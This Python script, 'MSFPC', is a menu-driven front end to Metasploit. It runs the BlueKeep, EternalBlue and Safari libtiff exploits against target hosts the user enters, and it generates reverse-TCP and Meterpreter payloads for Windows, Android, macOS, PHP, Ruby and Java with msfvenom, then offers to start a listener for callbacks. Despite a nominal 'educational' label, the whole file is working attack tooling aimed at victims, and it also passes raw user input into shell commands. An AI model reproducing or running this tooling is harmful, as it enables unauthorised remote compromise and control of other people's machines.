#usr/bin/python3
#---Created by t0rt3ll1n0---
#THIS SCRIPT HELP YOU TO CREAE PAYLOADS FOR EDUCATIONAL PURPOSES, SO IT NEVER CREATE AN uNdEtEcTaBlE pAyLoAd XD
#Maybe in future i will add encoders!!
#V 1.3
import sys
import os
import subprocess
import importlib.util
from time import sleep
import pyautogui #if you will have an error like "module missing" run setup.py ;)

class bcolors: 

	WARN = '\33[41m'
	RED = '\033[31m'
	ENDC = '\033[0m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	BOLD = '\033[1m'
	LINK = '\33[5m'


print(bcolors.BOLD + bcolors.RED)
print("""
     __  ________ __________  ______
    /  |/  / ___// ____/ __ \/ ____/
   / /|_/ /\__ \/ /_  / /_/ / /     
  / /  / /___/ / __/ / ____/ /___   
 /_/  /_//____/_/   /_/    \____/   
    V 1.3 --> GUI + LISTENER""")                                

print(bcolors.ENDC)
print(bcolors.BLUE)
print("""#MSF             ____________________________________________
#PAYLOADS	|\033[31m--->YOU NEED METASPLOIT FOR RUN THIS SCRIPT\033[94m |      
#CREATOR        ----------------------------------------------""")
print(bcolors.ENDC)
print(bcolors.LINK)
print("by t0rt3ll1n0")
print(bcolors.ENDC)
print("\33[41mDEVELOPERS ARE NOT RESPONSABLE\33[0m\n\33[41mFOR ANY DAMAGE CAUSED BY MSFPC\33[0m\n\n")
if sys.version_info.major < 3:
	print(bcolors.RED)
	print("MSFPC support only Python3. Rerun application in Python3 environment like sudo python3 MSFPC.py")
	print(bcolors.ENDC)
	exit(0)
if os.geteuid() != 0:
	print(bcolors.RED)
	exit("You need to have root privileges to run MSFPC.\nPlease try again, this time using 'sudo'. Exiting.\n")
	print(bcolors.ENDC)
print("""1)Create a payload
2)Launch msfconsole
3)Execute most popular exploit
4)Exit""")
print(bcolors.GREEN)
scelta = int(input("root@MSFPC:~# "))
print(bcolors.ENDC)
if(scelta == 2):
	os.system('sudo msfconsole')

if(scelta == 3):
	print("""---Most popular exploit menu---
1)Windows exploit
2)Apple_ios exploit""")
	print(bcolors.GREEN)
	scelta = int(input("root@MSFPC:/Exploit~# "))
	print(bcolors.ENDC)
	if(scelta == 1):
		print("\n---Windows exploit menu---\n")
		print("""1)Bluekeep exploit
2)Eternalblue exploit""")
		print(bcolors.GREEN)
		scelta = int(input("root@MSFPC:/Exploit/Windows~# "))
		print(bcolors.ENDC)
		if(scelta == 1):
			print("""\n\033[1m<BlueKeep exploit>\033[0m\n
CVE = 2019-0708
VALUE = MEDIUM
DIFFICULTY = 2/5 --> EASY/MEDIUM
#BlueKeep affect RDP (Remote Desktop Protocol) sending an arbitrary code (in this case a meterpreter session)
VULN_TARGETS --> WIN2000, WIN2003SVR, WINXP, WINVISTA, WIN7.
#BE SURE THAT THE VICTIM HAVE RDP ENABLED OR HIS PC WILL CRASH XD\n""")
			
			os.system('sudo rm bluekeep.txt')
			f= open("bluekeep.txt","w+")
			lhost = input("\033[92mSet LHOST --> ")
			rhosts = input("Set RHOSTS --> ")
			lport = input("Set LPORT --> ")
			payload = input("Set payload --> ")
			default_exploit = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
			for i in range (1):
				f.write("use " + default_exploit + "\nset LHOST " + lhost + "\nset LPORT " + lport + "\nset payload " + payload + "\nset RHOSTS " + rhosts + "\nexploit" )
			f.close()

			print("\n[+]\033[0m Executing msfconsole...")
			print(bcolors.RED)
			print("DON'T TOUCH ANYTHING DURING EXPLOITAION")
			print(bcolors.ENDC)
			os.system('sudo msfconsole -r bluekeep.txt')
			exit(0)
		if(scelta == 2):
			print("""\033[1m\n<EternalBlue exploit>\033[0m\n
CVE = 2017-0144
VALUE = AVERAGE
DIFFICULTY = 3/5 --> MEDIUM
#Eternalblue affect the smb protocol, used for printer sharing, sending an arbitrary code. 
VULN_TARGETS --> WINXP WIN7 WIN2008SVR
#BE SURE THAT THE VICTIM HAVE RDP ENABLED OR HIS PC WILL CRASH XD\n""")
			
			os.system('sudo rm eternalblue.txt')
			f= open("eternalblue.txt","w+")
			lhost = input("\033[92mSet LHOST --> ")
			rhosts = input("Set RHOSTS --> ")
			lport = input("Set LPORT --> ")
			payload = input("Set payload --> ")
			default_exploit = "exploit/windows/smb/ms17_010_eternalblue"
			for i in range (1):
				f.write("use " + default_exploit + "\nset LHOST " + lhost + "\nset LPORT " + lport + "\nset payload " + payload + "\nset RHOSTS " + rhosts + "\nexploit" )
			f.close()

			print("\n[+] \033[0mExecuting msfconsole...")
			print(bcolors.RED)
			print("DON'T TOUCH ANYTHING DURING EXPLOITAION")
			print(bcolors.ENDC)
			os.system('sudo msfconsole -r eternalblue.txt')
			exit(0)
		if(scelta < 1 or scelta > 2):
			print(bcolors.RED)
			print("Please select a valid option like 1 or 2.\nExiting...")
			print(bcolors.ENDC)
			exit(0)
	if(scelta ==2):
		print("""---Apple_ios exploit menu---\n
1)safari buffer owerflow\n""")
		scelta = int(input("\033[92mroot@MSFPC:/exploit/apple_ios~# \033[0m"))
		if(scelta == 1):
			print("""\033[1m<Apple_ios safari exploit>\033[0m\n
CVE = 2006-3459
VALUE = GOOD
DIFFICULTY = 3/5 --> MEDIUM
#THIS BUFFER OWERFLOW AFFECT ALL THE DEVICES USING SAFARI, SENDING A PAYLOAD. 
VULN_TARGETS --> MobileSafari iPhone Mac OS X (1.00, 1.01, 1.02, 1.1.1)
\n""")
			
			os.system('sudo rm apple_ios.txt')
			f= open("apple_ios.txt","w+")
			lhost = input("\033[92mSet LHOST --> ")
			svrhost = input("Set SVRHOST(your local ip) --> ")
			lport = input("Set LPORT --> ")
			svrport = input("Set SVRPORT --> ")
			print("""\n\033[31m                                            <-----PAYLOAD TIPES----->\033[0m
   0)  apple_ios/aarch64/meterpreter_reverse_http                Apple_iOS Meterpreter, Reverse HTTP Inline
   1)  apple_ios/aarch64/meterpreter_reverse_https               Apple_iOS Meterpreter, Reverse HTTPS Inline
   2)  apple_ios/aarch64/meterpreter_reverse_tcp                 Apple_iOS Meterpreter, Reverse TCP Inline
   3)  apple_ios/aarch64/shell_reverse_tcp                       Apple iOS aarch64 Command Shell, Reverse TCP Inline
   4)  apple_ios/armle/meterpreter_reverse_http                  Apple_iOS Meterpreter, Reverse HTTP Inline
   5)  apple_ios/armle/meterpreter_reverse_https                 Apple_iOS Meterpreter, Reverse HTTPS Inline
   6)  apple_ios/armle/meterpreter_reverse_tcp                   Apple_iOS Meterpreter, Reverse TCP Inline\n""")
			print("\33[41m!! COPY AND PASTE YOUR PAYLOAD, DON'T JUST TIPE 1 OR 2!!\33[0m\n")

			payload = input("\033[92mSet payload --> ")
			default_exploit = "exploit/apple_ios/browser/safari_libtiff"
			for i in range (1):
				f.write("use " + default_exploit + "\nset LHOST " + lhost + "\nset LPORT " + lport + "\nset payload " + payload + "\nset SVRHOST " + svrhost + "\nset SVRPORT " + svrport + "\nexploit" )
			f.close()

			print("\n[+] \033[0mExecuting msfconsole...")
			print(bcolors.RED)
			print("DON'T TOUCH ANYTHING DURING EXPLOITAION")
			print(bcolors.ENDC)
			os.system('sudo msfconsole -r apple_ios.txt')
			exit(0)


	if(scelta < 1 or scelta > 1):
		print(bcolors.RED)
		print("\nPlease select a valid option like 1.\nExiting...")
		print(bcolors.ENDC)
		exit(0)
		
			
#end of exploit menu	



if(scelta == 4):
	print("Exiting...")
if(scelta < 1 or scelta > 4):
	print(bcolors.RED)
	print("Please select a valid option like 1 2 or 3.\nExiting...")
	print(bcolors.ENDC)
	exit(0)
if(scelta == 1):
	print("""\n\033[1m---Payload Creation Menu---\033[0m\n
1) Create a payload for Windows OS
2) Create a payload for Android OS
3) Create a payload for MacOS
4) Create other payloads
5) Create a payload using a gui (beta)\n""")
	print(bcolors.GREEN)
	scelta = int(input("root@MSFPC:~# "))
	print(bcolors.ENDC)
	if(scelta == 1):
		print("""\033[1m---Windows payload creation menu---\033[0m\n
1) Create a x64 payload
2) Create a x86 payload\n""")
		print(bcolors.GREEN)
		scelta = int(input("root@MSFPC:/Windows~# "))
		print(bcolors.ENDC)
		if(scelta == 1):
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.exe) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)

		if(scelta == 2):
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.exe) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)
			
		if(scelta < 1 or scelta > 2):
			print(bcolors.RED)
			print("Please select a valid option like 1 or 2.\nExiting...")
			print(bcolors.ENDC)
			exit(0)
			
	if(scelta == 2):
		print("\033[1m---Android payload creation menu---\033[0m")
		lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
		lport = input("set LPORT (ex. 4444) --> ")
		output = input("set the OUTPUT of payload (ex. /home/user/payload.apk) --> ")
		print("[*]\033[0m Generating the payload please wait...")
		os.system('sudo msfvenom -p android/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
		print("\033[92m[+]\033[0m Payload generated successfully")
		msf = str(input("Do you want to setup a listener right now? Y/n --> "))
		if(msf == "Y"):
			print("\033[92m[+]\033[0m Executing msfconsole...")
			os.system('sudo msfconsole')
		if(msf == "y"):
			print("\033[92m[+]\033[0m Executing msfconsole...")
			os.system('sudo msfconsole')
		if(msf == "N"):
			print("\033[31mOk, exiting...\033[0m")
			exit(0)
		if(msf == "n"):
			print("\033[31mOk, exiting...\033[0m")
			exit(0)
		else:
			print("\33[41mAccepted chars: Y, y, N, n\33[0m")
			print("\33[41mExiting...\33[0m")
			exit(0)
	if(scelta == 3):
		print("""\033[1m---MacOS payload creation menu---\033[0m\n
1) Create a x64 payload
2) Create a x86 payload""")
		print(bcolors.GREEN)
		scelta = int(input("root@MSFPC:/payload/MacOS~# "))
		print(bcolors.ENDC)
		if(scelta == 1):
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.macho) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)
		if(scelta == 2):
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.macho) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")		
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)
		if(scelta < 1 or scelta > 2):
			print(bcolors.RED)
			print("Please select a valid option like 1 or 2.\nExiting...")
			print(bcolors.ENDC)
			exit(0)
	if(scelta == 4):
		print("""\033[1m---Other payloads menu---\033[0m\n
\n1) Create a php payload
2) Create a ruby payload
3) Create a java payload""")
		print(bcolors.GREEN)
		scelta = int(input("root@MSFPC:/payload/Other~# "))
		print(bcolors.ENDC)
		if(scelta == 1):
			print("\033[1m---Php payload creation menu---\033[0m")
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.php) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p php/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)
		if(scelta == 2):
			print("\033[1m---Ruby payload creation menu---\033[0m")
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.rb) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p ruby/shell_reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)
		if(scelta == 3):
			print("\033[1m---Java payload creation menu---\033[0m")
			lhost = input("\n\033[92mset LHOST (ex. 192.168.1.1) --> ")
			lport = input("set LPORT (ex. 4444) --> ")
			output = input("set the OUTPUT of payload (ex. /home/user/payload.jar) --> ")
			print("[*]\033[0m Generating the payload please wait...")
			os.system('sudo msfvenom -p java/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' X > '+output)
			print("\033[92m[+]\033[0m Payload generated successfully")
			msf = str(input("Do you want to setup a listener right now? Y/n --> "))
			if(msf == "Y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "y"):
				print("\033[92m[+]\033[0m Executing msfconsole...")
				os.system('sudo msfconsole')
			if(msf == "N"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			if(msf == "n"):
				print("\033[31mOk, exiting...\033[0m")
				exit(0)
			else:
				print("\33[41mAccepted chars: Y, y, N, n\33[0m")
				print("\33[41mExiting...\33[0m")
				exit(0)
		if(scelta < 1 or scelta > 3):
			print(bcolors.RED)
			print("Please select a valid option like 1 2 or 3.\nExiting...")
			print(bcolors.ENDC)
			exit(0)
	if(scelta == 5):
		print("\33[41mThis gui is experimental, plz run setup.py first!!\33[0m")
		lhost = pyautogui.prompt(text='', title='~set LHOST~')
		lport = pyautogui.prompt(text='', title='~set LPORT~')
		payload = pyautogui.prompt(text='', title='~set payload~')
		output = pyautogui.prompt(text='', title='~set output~')
		os.system('sudo msfvenom -p'+payload+' LHOST='+lhost+' LPORT='+lport+' -o '+output)
		pyautogui.alert(text='Finished to cretate payload', title='Finished', button='OK')			
	if(scelta < 1 or scelta > 5):
		print(bcolors.RED)
		print("Please select a valid option like 1, 2, 3 or 4.\nExiting...")
		print(bcolors.ENDC)
		exit(0)


#if you found any bug please contact me at bugtraq@protonmail.com
